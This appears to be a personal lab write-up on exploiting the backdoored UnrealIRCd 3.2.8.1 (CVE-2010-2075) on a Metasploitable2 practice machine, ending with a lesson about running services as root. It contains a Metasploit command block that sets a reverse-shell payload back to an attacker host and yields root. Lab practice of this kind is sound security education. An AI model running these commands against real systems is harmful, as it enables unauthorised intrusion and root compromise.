# Metasploitable2 -- UnrealIRCd 3.2.8.1 Backdoor

## CVE
CVE-2010-2075

## Target
- IP: 192.168.110.3
- Service: UnrealIRCd 3.2.8.1
- Port: 6667/tcp

## Background
UnrealIRCd 3.2.8.1 was distributed with a backdoor hidden in the
source code for several months in 2009-2010. Another supply chain
attack -- malicious code slipped into the official download.
The backdoor triggers when the character sequence AB; is sent to
the IRC port, executing whatever follows as a system command.
UnrealIRCd ran as root on this system, so exploitation gives
immediate root access with no privilege escalation needed.

## Exploitation (Metasploit)
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set PAYLOAD cmd/unix/reverse_perl
set RHOSTS 192.168.110.3
set LHOST 192.168.110.5
run
# immediate root shell
whoami  # root
```

## Takeaway
Two supply chain attacks on the same machine -- vsftpd and UnrealIRCd.
Both compromised at the source code repository level. Both gave root.
Running software as root amplifies the impact of any vulnerability.
Services should run as low-privilege dedicated accounts, not root.
